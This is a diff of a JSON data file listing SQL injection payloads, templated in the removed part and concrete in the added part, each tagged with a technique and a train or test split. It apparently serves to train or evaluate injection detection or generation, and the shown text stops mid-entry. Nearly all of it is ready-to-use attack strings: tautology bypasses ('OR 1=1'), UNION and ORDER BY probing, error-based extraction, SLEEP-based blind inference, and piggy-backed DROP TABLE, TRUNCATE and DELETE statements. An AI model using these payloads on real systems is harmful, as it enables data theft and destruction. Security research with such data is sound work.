-    "payload": "' AND extractvalue(1,concat($hex$,(SELECT COUNT($column_t1_1$) FROM $table_1$ WHERE $column_t1_2$ = $sample_t1_2$),$hex$))--",
-    "expected_types": [
-      "hex",
-      "all",
-      "table",
-      "all",
-      "all",
-      "hex"
-    ],
-    "information_features": "specific database",
-    "set": "train"
-  },
-  {
-    "type": "Error base attack",
-    "payload": "' AND GTID_SUBSET((SELECT $column_t1_1$ FROM $table_1$ WHERE $column_t1_2$ = $sample_t1_2$),$int$) = 1--",
-    "expected_types": [
-      "number",
-      "table",
-      "all",
-      "all",
-      "integer"
-    ],
-    "information_features": "specific database",
-    "set": "test"
-  },
-  {
-    "type": "Union-query attack",
-    "payload": "' UNION SELECT $column_t1_1$ FROM $table_1$--",
-    "expected_types": [
-      "all",
-      "table"
-    ],
-    "information_features": "specific database",
-    "set": "train"
-  },
-  {
-    "type": "Union-query attack",
-    "payload": "' UNION SELECT $column_t1_1$ FROM $table_1$ WHERE $column_t1_2$ = $sample_t1_2$--",
-    "expected_types": [
-      "all",
-      "table",
-      "all",
-      "all"
-    ],
-    "information_features": "specific database",
-    "set": "test"
-  },
-  {
-    "type": "Union-query attack",
-    "payload": "' UNION ALL SELECT $column_t1_1$ FROM $table_1$--",
-    "expected_types": [
-      "all",
-      "table"
-    ],
-    "information_features": "specific database",
-    "set": "test"
-  },
-  {
-    "type": "Union-query attack",
-    "payload": "' UNION ALL SELECT $column_t1_1$ FROM $table_1$ WHERE $column_t1_2$ = $sample_t1_2$--",
-    "expected_types": [
-      "all",
-      "table",
-      "all",
-      "all"
-    ],
-    "information_features": "specific database",
-    "set": "test"
-  },
-  {
-    "type": "Union-query attack",
-    "payload": "' UNION SELECT TB.$column_t2_1$ FROM $table_1$ AS TA INNER JOIN $table_2$ AS TB ON TB.$column_t2_2$ = TA.$column_t1_1$ WHERE TA.$column_t1_2$ = $sample_t1_2$--",
-    "expected_types": [
-      "all",
-      "table",
-      "table",
-      "number",
-      "number",
-      "all",
-      "all"
-    ],
-    "information_features": "specific database",
-    "set": "test"
-  },
-  {
-    "type": "Tautologies attack",
-    "payload": "' OR (SELECT $column_t1_1$ FROM $table_1$ WHERE $column_t1_2$ = $sample_t1_2$) = $sample_t1_1$--",
-    "expected_types": [
-      "all",
-      "table",
-      "all",
-      "all",
-      "all"
-    ],
-    "information_features": "specific database",
-    "set": "test"
-  },
-  {
-    "type": "Tautologies attack",
-    "payload": "' OR (SELECT $column_t1_1$ FROM $table_1$ WHERE $column_t1_2$ = $sample_t1_2$)>0--",
-    "expected_types": [
-      "number",
-      "table",
-      "all",
-      "all"
-    ],
-    "information_features": "specific database",
-    "set": "train"
-  },
-  {
-    "type": "Tautologies attack",
-    "payload": "' OR LENGTH(SELECT TB.$column_t2_1$ FROM $table_1$ AS TA INNER JOIN $table_2$ AS TB ON TB.$column_t2_2$ = TA.$column_t1_1$ WHERE TA.$column_t1_2$ = $sample_t1_2$)>0--",
-    "expected_types": [
-      "string",
-      "table",
-      "table",
-      "number",
-      "number",
-      "all",
-      "all"
-    ],
-    "information_features": "specific database",
-    "set": "test"
-  },
-  {
-    "type": "Tautologies attack",
-    "payload": "' OR (SELECT $column_t1_1$ FROM $table_1$ WHERE $column_t1_2$ = $sample_t1_2$) IS NOT NULL--",
-    "expected_types": [
-      "all",
-      "table",
-      "all",
-      "all"
-    ],
-    "information_features": "specific database",
-    "set": "test"
-  },
-  {
-    "type": "Tautologies attack",
-    "payload": "' OR EXISTS(SELECT COUNT($column_t1_1$) FROM $table_1$ WHERE $column_t1_2$ = $sample_t1_2$)--",
-    "expected_types": [
-      "all",
-      "table",
-      "all",
-      "all"
-    ],
-    "information_features": "specific database",
-    "set": "test"
-  },
-  {
-    "type": "Tautologies attack",
-    "payload": "' OR (SELECT TB.$column_t2_1$ FROM $table_1$ AS TA INNER JOIN $table_2$ AS TB ON TB.$column_t2_2$ = TA.$column_t1_1$ WHERE TA.$column_t1_2$ = $sample_t1_2$) LIKE $sample_t2_1$--",
-    "expected_types": [
-      "string",
-      "table",
-      "table",
-      "number",
-      "number",
-      "all",
-      "all",
-      "string"
-    ],
-    "information_features": "specific database",
-    "set": "train"
-  },
-  {
-    "type": "Tautologies attack",
-    "payload": "' OR (SELECT TB.$column_t2_1$ FROM $table_1$ AS TA INNER JOIN $table_2$ AS TB ON TB.$column_t2_2$ = TA.$column_t1_1$ WHERE TA.$column_t1_2$ = $sample_t1_2$) REGEXP '[a-z]'--",
-    "expected_types": [
-      "string",
-      "table",
-      "table",
-      "number",
-      "number",
-      "all",
-      "all"
-    ],
-    "information_features": "specific database",
-    "set": "test"
-  },
-  {
-    "type": "Tautologies attack",
-    "payload": "' OR NOT ISNULL(SELECT TB.$column_t2_1$ FROM $table_1$ AS TA INNER JOIN $table_2$ AS TB ON TB.$column_t2_2$ = TA.$column_t1_1$ WHERE TA.$column_t1_2$ = $sample_t1_2$)--",
-    "expected_types": [
-      "all",
-      "table",
-      "table",
-      "number",
-      "number",
-      "all",
-      "all"
-    ],
-    "information_features": "specific database",
-    "set": "test"
-  },
-  {
-    "type": "Tautologies attack",
-    "payload": "' OR COALESCE(SELECT COUNT($column_t1_1$) FROM $table_1$ WHERE $column_t1_2$ = $sample_t1_2$)--",
-    "expected_types": [
-      "all",
-      "table",
-      "all",
-      "all"
-    ],
-    "information_features": "specific database",
-    "set": "train"
-  },
-  {
-    "type": "Tautologies attack",
-    "payload": "' OR (SELECT TB.$column_t2_1$ FROM $table_1$ AS TA INNER JOIN $table_2$ AS TB ON TB.$column_t2_2$ = TA.$column_t1_1$ WHERE TA.$column_t1_2$ = $sample_t1_2$)=(SELECT TB.$column_t2_1$ FROM $table_1$ AS TA INNER JOIN $table_2$ AS TB ON TB.$column_t2_2$ = TA.$column_t1_1$ WHERE TA.$column_t1_2$ = $sample_t1_2$)--",
-    "expected_types": [
-      "number",
-      "table",
-      "table",
-      "number",
-      "number",
-      "all",
-      "all",
-      "number",
-      "table",
-      "table",
-      "number",
-      "number",
-      "all",
-      "all"
-    ],
-    "information_features": "specific database",
-    "set": "test"
-  },
-  {
-    "type": "Tautologies attack",
-    "payload": "' OR CASE WHEN (SELECT $column_t1_1$ FROM $table_1$ WHERE $column_t1_2$ = $sample_t1_2$) = $sample_t1_1$ THEN 1 ELSE 0 END=1--",
-    "expected_types": [
-      "all",
-      "table",
-      "all",
-      "all",
-      "all"
-    ],
-    "information_features": "specific database",
-    "set": "test"
-  },
-  {
-    "type": "Tautologies attack",
-    "payload": "' OR SUBSTRING(SELECT $column_t1_1$ FROM $table_1$ WHERE $column_t1_2$ = $sample_t1_2$,1,1) = $character$--",
-    "expected_types": [
-      "string",
-      "table",
-      "all",
-      "all",
-      "character"
-    ],
-    "information_features": "specific database",
-    "set": "train"
-  },
-  {
-    "type": "Tautologies attack",
-    "payload": "' OR LEFT(SELECT $column_t1_1$ FROM $table_1$ WHERE $column_t1_2$ = $sample_t1_2$,1) = $character$--",
-    "expected_types": [
-      "string",
-      "table",
-      "all",
-      "all",
-      "character"
-    ],
-    "information_features": "specific database",
-    "set": "test"
-  },
-  {
-    "type": "Piggy-backed queries attacks",
-    "payload": "'; SELECT $column_t1_1$ FROM $table_1$;--",
-    "expected_types": [
-      "all",
-      "table"
-    ],
-    "information_features": "specific database",
-    "set": "train"
-  },
-  {
-    "type": "Piggy-backed queries attacks",
-    "payload": "'; DELETE FROM $table_1$ WHERE $column_t1_1$ = $sample_t1_1$;--",
-    "expected_types": [
-      "table",
-      "all",
-      "all"
-    ],
-    "information_features": "specific database",
-    "set": "train"
-  },
-  {
-    "type": "Piggy-backed queries attacks",
-    "payload": "'; DELETE FROM $table_1$ WHERE $sysInfo$ IS NOT NULL;--",
-    "expected_types": [
-      "table",
-      "all"
-    ],
-    "information_features": "specific database",
-    "set": "test"
-  },
-  {
-    "type": "Piggy-backed queries attacks",
-    "payload": "'; TRUNCATE TABLE $table_1$;--",
-    "expected_types": [
-      "table"
-    ],
-    "information_features": "specific database",
-    "set": "test"
-  },
-  {
-    "type": "Piggy-backed queries attacks",
-    "payload": "'; DROP TABLE IF EXISTS $table_1$;--",
-    "expected_types": [
-      "table"
-    ],
-    "information_features": "specific database",
-    "set": "train"
-  },
-  {
-    "type": "Piggy-backed queries attacks",
-    "payload": "'; SELECT $column_t1_1$ FROM $table_1$ WHERE $column_t1_2$ = $sample_t1_2$;--",
-    "expected_types": [
-      "all",
-      "table",
-      "all",
-      "all"
-    ],
-    "information_features": "specific database",
-    "set": "test"
-  },
-  {
-    "type": "Piggy-backed queries attacks",
-    "payload": "'; INSERT INTO temp_table SELECT * FROM $table_1$;--",
-    "expected_types": [
-      "table"
-    ],
-    "information_features": "specific database",
-    "set": "test"
-  },
-  {
-    "type": "Piggy-backed queries attacks",
-    "payload": "'; INSERT INTO temp_table SELECT $column_t1_1$ FROM $table_1$ WHERE $column_t1_2$ = $sample_t1_2$;--",
-    "expected_types": [
-      "all",
-      "table",
-      "all",
-      "all"
-    ],
-    "information_features": "specific database",
-    "set": "test"
-  },
-  {
-    "type": "Piggy-backed queries attacks",
-    "payload": "'; CREATE TABLE temp_data AS SELECT * FROM $table_1$;--",
-    "expected_types": [
-      "table"
-    ],
-    "information_features": "specific database",
-    "set": "test"
-  },
-  {
-    "type": "Piggy-backed queries attacks",
-    "payload": "'; CREATE TABLE temp_data AS SELECT $column_t1_1$ FROM $table_1$ WHERE $column_t1_2$ = $sample_t1_2$;--",
-    "expected_types": [
-      "all",
-      "table",
-      "all",
-      "all"
-    ],
-    "information_features": "specific database",
-    "set": "test"
-  },
-  {
-    "type": "Piggy-backed queries attacks",
-    "payload": "'; UPDATE $table_1$ SET $column_t1_1$ = $int$ WHERE $column_t1_2$ = $sample_t1_2$;--",
-    "expected_types": [
-      "table",
-      "number",
-      "integer",
-      "all",
-      "all"
-    ],
-    "information_features": "specific database",
-    "set": "train"
-  },
-  {
-    "type": "Boolean base inference attack",
-    "payload": "' AND (SELECT $column_t1_1$ FROM $table_1$ WHERE $column_t1_2$ = $sample_t1_2$) = $sample_t1_1$--",
-    "expected_types": [
-      "all",
-      "table",
-      "all",
-      "all",
-      "all"
-    ],
-    "information_features": "specific database",
-    "set": "test"
-  },
-  {
-    "type": "Boolean base inference attack",
-    "payload": "' AND (SELECT COUNT($column_t1_1$) FROM $table_1$ WHERE $column_t1_2$ = $sample_t1_2$)>$int$--",
-    "expected_types": [
-      "all",
-      "table",
-      "all",
-      "all",
-      "integer"
-    ],
-    "information_features": "specific database",
-    "set": "train"
-  },
-  {
-    "type": "Boolean base inference attack",
-    "payload": "' AND LENGTH(SELECT TB.$column_t2_1$ FROM $table_1$ AS TA INNER JOIN $table_2$ AS TB ON TB.$column_t2_2$ = TA.$column_t1_1$ WHERE TA.$column_t1_2$ = $sample_t1_2$)>$int$--",
-    "expected_types": [
-      "string",
-      "table",
-      "table",
-      "number",
-      "number",
-      "all",
-      "all",
-      "integer"
-    ],
-    "information_features": "specific database",
-    "set": "test"
-  },
-  {
-    "type": "Boolean base inference attack",
-    "payload": "' AND (SELECT $column_t1_1$ FROM $table_1$ WHERE $column_t1_2$ = $sample_t1_2$) LIKE $character$--",
-    "expected_types": [
-      "string",
-      "table",
-      "all",
-      "all",
-      "character"
-    ],
-    "information_features": "specific database",
-    "set": "train"
-  },
-  {
-    "type": "Boolean base inference attack",
-    "payload": "' AND (SELECT TB.$column_t2_1$ FROM $table_1$ AS TA INNER JOIN $table_2$ AS TB ON TB.$column_t2_2$ = TA.$column_t1_1$ WHERE TA.$column_t1_2$ = $sample_t1_2$) REGEXP '[0-9]'--",
-    "expected_types": [
-      "string",
-      "table",
-      "table",
-      "number",
-      "number",
-      "all",
-      "all"
-    ],
-    "information_features": "specific database",
-    "set": "test"
-  },
-  {
-    "type": "Boolean base inference attack",
-    "payload": "' AND RIGHT(SELECT $column_t1_1$ FROM $table_1$ WHERE $column_t1_2$ = $sample_t1_2$,1) = $character$--",
-    "expected_types": [
-      "string",
-      "table",
-      "all",
-      "all",
-      "character"
-    ],
-    "information_features": "specific database",
-    "set": "test"
-  },
-  {
-    "type": "Boolean base inference attack",
-    "payload": "' AND SUBSTR(SELECT TB.$column_t2_1$ FROM $table_1$ AS TA INNER JOIN $table_2$ AS TB ON TB.$column_t2_2$ = TA.$column_t1_1$ WHERE TA.$column_t1_2$ = $sample_t1_2$, 1, 1) > $character$--",
-    "expected_types": [
-      "string",
-      "table",
-      "table",
-      "number",
-      "number",
-      "all",
-      "all",
-      "character"
-    ],
-    "information_features": "specific database",
-    "set": "train"
-  },
-  {
-    "type": "Boolean base inference attack",
-    "payload": "' AND SUBSTR(SELECT $column_t1_1$ FROM $table_1$ WHERE $column_t1_2$ = $sample_t1_2$, 1 ,1) IN ('a','e','i','o','u')--",
-    "expected_types": [
-      "string",
-      "table",
-      "all",
-      "all"
-    ],
-    "information_features": "specific database",
-    "set": "test"
-  },
-  {
-    "type": "Boolean base inference attack",
-    "payload": "' AND ASCII(SUBSTR(SELECT $column_t1_1$ FROM $table_1$ WHERE $column_t1_2$ = $sample_t1_2$, 1, 1)) = $int$--",
-    "expected_types": [
-      "string",
-      "table",
-      "all",
-      "all",
-      "integer"
-    ],
-    "information_features": "specific database",
-    "set": "test"
-  },
-  {
-    "type": "Boolean base inference attack",
-    "payload": "' AND CASE WHEN (SELECT $column_t1_1$ FROM $table_1$ WHERE $column_t1_2$ = $sample_t1_2$) = $sample_t1_1$ THEN 1 ELSE 0 END = 1--",
-    "expected_types": [
-      "all",
-      "table",
-      "all",
-      "all",
-      "all"
-    ],
-    "information_features": "specific database",
-    "set": "test"
-  },
-  {
-    "type": "Boolean base inference attack",
-    "payload": "' AND IF((SELECT COUNT($column_t1_1$) FROM $table_1$ WHERE $column_t1_2$ = $sample_t1_2$)>$int$,1,0) = 1--",
-    "expected_types": [
-      "all",
-      "table",
-      "all",
-      "all",
-      "integer"
-    ],
-    "information_features": "specific database",
-    "set": "train"
-  },
-  {
-    "type": "Time base inference attack",
-    "payload": "' AND (SELECT SLEEP($int$) WHERE (SELECT $column_t1_1$ FROM $table_1$ WHERE $column_t1_2$ = $sample_t1_2$) = $sample_t1_1$--",
-    "expected_types": [
-      "integer",
-      "all",
-      "table",
-      "all",
-      "all",
-      "all"
-    ],
-    "information_features": "specific database",
-    "set": "test"
-  },
-  {
-    "type": "Time base inference attack",
-    "payload": "' AND (SELECT SLEEP($int$) WHERE (SELECT COUNT($column_t1_1$) FROM $table_1$ WHERE $column_t1_2$ = $sample_t1_2$)>$int$--",
-    "expected_types": [
-      "integer",
-      "all",
-      "table",
-      "all",
-      "all",
-      "integer"
-    ],
-    "information_features": "specific database",
-    "set": "test"
-  },
-  {
-    "type": "Time base inference attack",
-    "payload": "' AND (SELECT SLEEP($int$) WHERE (SELECT TB.$column_t2_1$ FROM $table_1$ AS TA INNER JOIN $table_2$ AS TB ON TB.$column_t2_2$ = TA.$column_t1_1$ WHERE TA.$column_t1_2$ = $sample_t1_2$) LIKE $character$--",
-    "expected_types": [
-      "integer",
-      "string",
-      "table",
-      "table",
-      "number",
-      "number",
-      "all",
-      "all",
-      "character"
-    ],
-    "information_features": "specific database",
-    "set": "train"
-  },
-  {
-    "type": "Time base inference attack",
-    "payload": "' AND IF((SELECT SUBSTRING(SELECT $column_t1_1$ FROM $table_1$ WHERE $column_t1_2$ = $sample_t1_2$,$int$,1)) = $character$,SLEEP($int$),0)--",
-    "expected_types": [
-      "string",
-      "table",
-      "all",
-      "all",
-      "integer",
-      "character",
-      "integer"
-    ],
-    "information_features": "specific database",
-    "set": "train"
-  },
-  {
-    "type": "Time base inference attack",
-    "payload": "' AND CASE WHEN (SELECT TB.$column_t2_1$ FROM $table_1$ AS TA INNER JOIN $table_2$ AS TB ON TB.$column_t2_2$ = TA.$column_t1_1$ WHERE TA.$column_t1_2$ = $sample_t1_2$) = $sample$ THEN SLEEP(5) ELSE 0 END--",
-    "expected_types": [
-      "all",
-      "table",
-      "table",
-      "number",
-      "number",
-      "all",
-      "all",
-      "all"
-    ],
-    "information_features": "specific database",
-    "set": "test"
-  },
-  {
-    "type": "Time base inference attack",
-    "payload": "' AND CASE WHEN (SELECT $column_t1_1$ FROM $table_1$ WHERE $column_t1_2$ = $sample_t1_2$) REGEXP '[a-z]' THEN SLEEP(5) ELSE 0 END--",
-    "expected_types": [
-      "string",
-      "table",
-      "all",
-      "all"
-    ],
-    "information_features": "specific database",
-    "set": "test"
-  },
-  {
-    "type": "Time base inference attack",
-    "payload": "' AND (SELECT BENCHMARK(1000000,MD5(1)) WHERE SUBSTR(SELECT $column_t1_1$ FROM $table_1$ WHERE $column_t1_2$ = $sample_t1_2$,1,1) IN ('a','e','i','o','u')--",
-    "expected_types": [
-      "string",
-      "table",
-      "all",
-      "all"
-    ],
-    "information_features": "specific database",
-    "set": "test"
-  },
-  {
-    "type": "Time base inference attack",
-    "payload": "' AND (SELECT COUNT(*) FROM $table_1$,$table_2$,$table_3$)>$int$--",
-    "expected_types": [
-      "table",
-      "table",
-      "table",
-      "integer"
-    ],
-    "information_features": "specific database",
-    "set": "test"
-  }
+    {
+        "technique": "error_based",
+        "payload": "' AND CAST('abc' AS UNSIGNED) = 1",
+        "expected_types": null,
+        "reference_scope": "lor",
+        "set": "train"
+    },
+    {
+        "technique": "error_based",
+        "payload": "' AND CAST('test' AS DECIMAL)",
+        "expected_types": null,
+        "reference_scope": "lor",
+        "set": "test"
+    },
+    {
+        "technique": "error_based",
+        "payload": "' AND CAST((SELECT CONCAT('string', 'apple') AS UNSIGNED)",
+        "expected_types": null,
+        "reference_scope": "lor",
+        "set": "test"
+    },
+    {
+        "technique": "error_based",
+        "payload": "' AND 'a example' > 1",
+        "expected_types": null,
+        "reference_scope": "lor",
+        "set": "test"
+    },
+    {
+        "technique": "error_based",
+        "payload": "' AND 'simple example' + 0",
+        "expected_types": null,
+        "reference_scope": "lor",
+        "set": "test"
+    },
+    {
+        "technique": "error_based",
+        "payload": "' AND 1=1 THEN CAST('abc' AS UNSIGNED) ELSE 0 END)",
+        "expected_types": null,
+        "reference_scope": "lor",
+        "set": "test"
+    },
+    {
+        "technique": "error_based",
+        "payload": "' AND 1/(SELECT 0)",
+        "expected_types": null,
+        "reference_scope": "lor",
+        "set": "train"
+    },
+    {
+        "technique": "error_based",
+        "payload": "' AND MOD(1,(SELECT 0))",
+        "expected_types": null,
+        "reference_scope": "lor",
+        "set": "test"
+    },
+    {
+        "technique": "error_based",
+        "payload": "' AND SQRT(-1)",
+        "expected_types": null,
+        "reference_scope": "lor",
+        "set": "train"
+    },
+    {
+        "technique": "error_based",
+        "payload": "' AND LOG2(-1)",
+        "expected_types": null,
+        "reference_scope": "lor",
+        "set": "test"
+    },
+    {
+        "technique": "error_based",
+        "payload": "' AND (SELECT 9223372036854775807 + 1)",
+        "expected_types": null,
+        "reference_scope": "lor",
+        "set": "train"
+    },
+    {
+        "technique": "error_based",
+        "payload": "' AND (SELECT -9223372036854775808 - 1)",
+        "expected_types": null,
+        "reference_scope": "lor",
+        "set": "test"
+    },
+    {
+        "technique": "error_based",
+        "payload": "' AND (SELECT 1.7976931348623157e+308 * 2)",
+        "expected_types": null,
+        "reference_scope": "lor",
+        "set": "test"
+    },
+    {
+        "technique": "error_based",
+        "payload": "' AND SUBSTR('test', 1, -1)",
+        "expected_types": null,
+        "reference_scope": "lor",
+        "set": "test"
+    },
+    {
+        "technique": "error_based",
+        "payload": "' AND SUBSTR('test', 'fly', 1)",
+        "expected_types": null,
+        "reference_scope": "lor",
+        "set": "test"
+    },
+    {
+        "technique": "error_based",
+        "payload": "' AND TIME('animal') = '15:00:02'",
+        "expected_types": null,
+        "reference_scope": "lor",
+        "set": "test"
+    },
+    {
+        "technique": "error_based",
+        "payload": "' AND DATE('talk') = '2002-10-1'",
+        "expected_types": null,
+        "reference_scope": "lor",
+        "set": "test"
+    },
+    {
+        "technique": "error_based",
+        "payload": "' AND TO_DAYS(21324) = 281911",
+        "expected_types": null,
+        "reference_scope": "lor",
+        "set": "test"
+    },
+    {
+        "technique": "error_based",
+        "payload": "' AND extractvalue(1,concat(0x1fde75d7,'daiodww',0x1fde75d7))",
+        "expected_types": null,
+        "reference_scope": "lor",
+        "set": "train"
+    },
+    {
+        "technique": "error_based",
+        "payload": "' AND updatexml(1,concat(0x34332c7b,778,0x1d4d5cd7),1)",
+        "expected_types": null,
+        "reference_scope": "lor",
+        "set": "test"
+    },
+    {
+        "technique": "error_based",
+        "payload": "' AND GTID_SUBSET('learning',1) = 1",
+        "expected_types": null,
+        "reference_scope": "lor",
+        "set": "test"
+    },
+    {
+        "technique": "error_based",
+        "payload": "' AND GTID_SUBTRACT('deep',101) = 1",
+        "expected_types": null,
+        "reference_scope": "lor",
+        "set": "test"
+    },
+    {
+        "technique": "union_query",
+        "payload": "' UNION SELECT NULL",
+        "expected_types": null,
+        "reference_scope": "lor",
+        "set": "train"
+    },
+    {
+        "technique": "union_query",
+        "payload": "' ORDER BY 1",
+        "expected_types": null,
+        "reference_scope": "lor",
+        "set": "train"
+    },
+    {
+        "technique": "union_query",
+        "payload": "' ORDER BY 2",
+        "expected_types": null,
+        "reference_scope": "lor",
+        "set": "train"
+    },
+    {
+        "technique": "union_query",
+        "payload": "' ORDER BY 3",
+        "expected_types": null,
+        "reference_scope": "lor",
+        "set": "train"
+    },
+    {
+        "technique": "union_query",
+        "payload": "' GROUP BY 1",
+        "expected_types": null,
+        "reference_scope": "lor",
+        "set": "train"
+    },
+    {
+        "technique": "union_query",
+        "payload": "' GROUP BY 2",
+        "expected_types": null,
+        "reference_scope": "lor",
+        "set": "train"
+    },
+    {
+        "technique": "union_query",
+        "payload": "' GROUP BY 3",
+        "expected_types": null,
+        "reference_scope": "lor",
+        "set": "train"
+    },
+    {
+        "technique": "union_query",
+        "payload": "' GROUP BY 1 HAVING 1 = 1",
+        "expected_types": null,
+        "reference_scope": "lor",
+        "set": "train"
+    },
+    {
+        "technique": "union_query",
+        "payload": "' GROUP BY 1,2 HAVING 1 = 1",
+        "expected_types": null,
+        "reference_scope": "lor",
+        "set": "train"
+    },
+    {
+        "technique": "union_query",
+        "payload": "' UNION SELECT 1",
+        "expected_types": null,
+        "reference_scope": "lor",
+        "set": "train"
+    },
+    {
+        "technique": "union_query",
+        "payload": "' ORDER BY 2",
+        "expected_types": null,
+        "reference_scope": "lor",
+        "set": "test"
+    },
+    {
+        "technique": "union_query",
+        "payload": "' ORDER BY 3",
+        "expected_types": null,
+        "reference_scope": "lor",
+        "set": "test"
+    },
+    {
+        "technique": "union_query",
+        "payload": "' GROUP BY 1",
+        "expected_types": null,
+        "reference_scope": "lor",
+        "set": "test"
+    },
+    {
+        "technique": "union_query",
+        "payload": "' GROUP BY 2",
+        "expected_types": null,
+        "reference_scope": "lor",
+        "set": "test"
+    },
+    {
+        "technique": "union_query",
+        "payload": "' GROUP BY 3",
+        "expected_types": null,
+        "reference_scope": "lor",
+        "set": "test"
+    },
+    {
+        "technique": "union_query",
+        "payload": "' GROUP BY 1 HAVING 1 = 1",
+        "expected_types": null,
+        "reference_scope": "lor",
+        "set": "test"
+    },
+    {
+        "technique": "union_query",
+        "payload": "' GROUP BY 1,2 HAVING 1 = 1",
+        "expected_types": null,
+        "reference_scope": "lor",
+        "set": "test"
+    },
+    {
+        "technique": "union_query",
+        "payload": "' UNION SELECT 'name'",
+        "expected_types": null,
+        "reference_scope": "lor",
+        "set": "train"
+    },
+    {
+        "technique": "union_query",
+        "payload": "' UNION SELECT 8392",
+        "expected_types": null,
+        "reference_scope": "lor",
+        "set": "test"
+    },
+    {
+        "technique": "tautology",
+        "payload": "' OR 1 = 1",
+        "expected_types": null,
+        "reference_scope": "lor",
+        "set": "train"
+    },
+    {
+        "technique": "tautology",
+        "payload": "' OR 'a' = 'a'",
+        "expected_types": null,
+        "reference_scope": "lor",
+        "set": "test"
+    },
+    {
+        "technique": "tautology",
+        "payload": "' OR 2 > 1",
+        "expected_types": null,
+        "reference_scope": "lor",
+        "set": "test"
+    },
+    {
+        "technique": "tautology",
+        "payload": "' OR 1 * 1 = 1",
+        "expected_types": null,
+        "reference_scope": "lor",
+        "set": "test"
+    },
+    {
+        "technique": "tautology",
+        "payload": "' OR 2/2 = 1",
+        "expected_types": null,
+        "reference_scope": "lor",
+        "set": "test"
+    },
+    {
+        "technique": "tautology",
+        "payload": "' OR 'a' LIKE '%'",
+        "expected_types": null,
+        "reference_scope": "lor",
+        "set": "train"
+    },
+    {
+        "technique": "tautology",
+        "payload": "' OR 'a' REGEXP '[a-z]'",
+        "expected_types": null,
+        "reference_scope": "lor",
+        "set": "test"
+    },
+    {
+        "technique": "tautology",
+        "payload": "' OR TRIM(' ') = ''",
+        "expected_types": null,
+        "reference_scope": "lor",
+        "set": "test"
+    },
+    {
+        "technique": "tautology",
+        "payload": "' OR LTRIM(' a') = 'a'",
+        "expected_types": null,
+        "reference_scope": "lor",
+        "set": "test"
+    },
+    {
+        "technique": "tautology",
+        "payload": "' OR RTRIM('a ') = 'a'",
+        "expected_types": null,
+        "reference_scope": "lor",
+        "set": "test"
+    },
+    {
+        "technique": "tautology",
+        "payload": "' OR REPLACE('abc','b','x') = 'axc'",
+        "expected_types": null,
+        "reference_scope": "lor",
+        "set": "test"
+    },
+    {
+        "technique": "tautology",
+        "payload": "' OR INSTR('hello','e') = 2",
+        "expected_types": null,
+        "reference_scope": "lor",
+        "set": "test"
+    },
+    {
+        "technique": "tautology",
+        "payload": "' OR SUBSTRING('test',1,1) = 't'",
+        "expected_types": null,
+        "reference_scope": "lor",
+        "set": "train"
+    },
+    {
+        "technique": "tautology",
+        "payload": "' OR LENGTH('') = 0",
+        "expected_types": null,
+        "reference_scope": "lor",
+        "set": "train"
+    },
+    {
+        "technique": "tautology",
+        "payload": "' OR LOWER('A') = 'a'",
+        "expected_types": null,
+        "reference_scope": "lor",
+        "set": "test"
+    },
+    {
+        "technique": "tautology",
+        "payload": "' OR UPPER('a') = 'A'",
+        "expected_types": null,
+        "reference_scope": "lor",
+        "set": "test"
+    },
+    {
+        "technique": "tautology",
+        "payload": "' OR QUOTE('test') = '\\'test\\''",
+        "expected_types": null,
+        "reference_scope": "lor",
+        "set": "test"
+    },
+    {
+        "technique": "tautology",
+        "payload": "' OR ABS(-5) = 5",
+        "expected_types": null,
+        "reference_scope": "lor",
+        "set": "train"
+    },
+    {
+        "technique": "tautology",
+        "payload": "' OR LEAST(1,2) = 1",
+        "expected_types": null,
+        "reference_scope": "lor",
+        "set": "test"
+    },
+    {
+        "technique": "tautology",
+        "payload": "' OR GREATEST(1,2) = 2",
+        "expected_types": null,
+        "reference_scope": "lor",
+        "set": "test"
+    },
+    {
+        "technique": "tautology",
+        "payload": "' OR ROUND(3.7) = 4",
+        "expected_types": null,
+        "reference_scope": "lor",
+        "set": "test"
+    },
+    {
+        "technique": "tautology",
+        "payload": "' OR CEIL(3.2) = 4",
+        "expected_types": null,
+        "reference_scope": "lor",
+        "set": "test"
+    },
+    {
+        "technique": "tautology",
+        "payload": "' OR FLOOR(3.8) = 3",
+        "expected_types": null,
+        "reference_scope": "lor",
+        "set": "test"
+    },
+    {
+        "technique": "tautology",
+        "payload": "' OR 1 REGEXP '^[0-9]+$' = 1",
+        "expected_types": null,
+        "reference_scope": "lor",
+        "set": "test"
+    },
+    {
+        "technique": "tautology",
+        "payload": "' OR 1.0 REGEXP '^[0-9]+\\.[0-9]+$' = 1",
+        "expected_types": null,
+        "reference_scope": "lor",
+        "set": "test"
+    },
+    {
+        "technique": "tautology",
+        "payload": "' OR 'a' REGEXP '^[a-zA-Z]+$' = 1",
+        "expected_types": null,
+        "reference_scope": "lor",
+        "set": "train"
+    },
+    {
+        "technique": "tautology",
+        "payload": "' OR IF(1=1,'true','false') = 'true'",
+        "expected_types": null,
+        "reference_scope": "lor",
+        "set": "train"
+    },
+    {
+        "technique": "tautology",
+        "payload": "' OR NULLIF(1,2) = 1",
+        "expected_types": null,
+        "reference_scope": "lor",
+        "set": "test"
+    },
+    {
+        "technique": "tautology",
+        "payload": "' OR COALESCE(NULL,1) = 1",
+        "expected_types": null,
+        "reference_scope": "lor",
+        "set": "test"
+    },
+    {
+        "technique": "tautology",
+        "payload": "' OR IFNULL(NULL,1) = 1",
+        "expected_types": null,
+        "reference_scope": "lor",
+        "set": "test"
+    },
+    {
+        "technique": "tautology",
+        "payload": "' OR ISNULL(NULL) = 1",
+        "expected_types": null,
+        "reference_scope": "lor",
+        "set": "test"
+    },
+    {
+        "technique": "tautology",
+        "payload": "' OR DATE('2023-01-01') = '2023-01-01'",
+        "expected_types": null,
+        "reference_scope": "lor",
+        "set": "test"
+    },
+    {
+        "technique": "tautology",
+        "payload": "' OR TO_DAYS('2023-01-01') > 700000",
+        "expected_types": null,
+        "reference_scope": "lor",
+        "set": "test"
+    },
+    {
+        "technique": "tautology",
+        "payload": "' OR ROUND(TO_DAYS(NOW())) > 0",
+        "expected_types": null,
+        "reference_scope": "scr",
+        "set": "test"
+    },
+    {
+        "technique": "tautology",
+        "payload": "' OR TIME(NOW()) IS NOT NULL",
+        "expected_types": null,
+        "reference_scope": "scr",
+        "set": "test"
+    },
+    {
+        "technique": "time_blind",
+        "payload": "' AND SLEEP(5)",
+        "expected_types": null,
+        "reference_scope": "lor",
+        "set": "test"
+    },
+    {
+        "technique": "time_blind",
+        "payload": "' OR SLEEP(5)",
+        "expected_types": null,
+        "reference_scope": "lor",
+        "set": "train"
+    },
+    {
+        "technique": "time_blind",
+        "payload": "' AND IF(191 = 191,SLEEP(5),0)",
+        "expected_types": null,
+        "reference_scope": "lor",
+        "set": "train"
+    },
+    {
+        "technique": "time_blind",
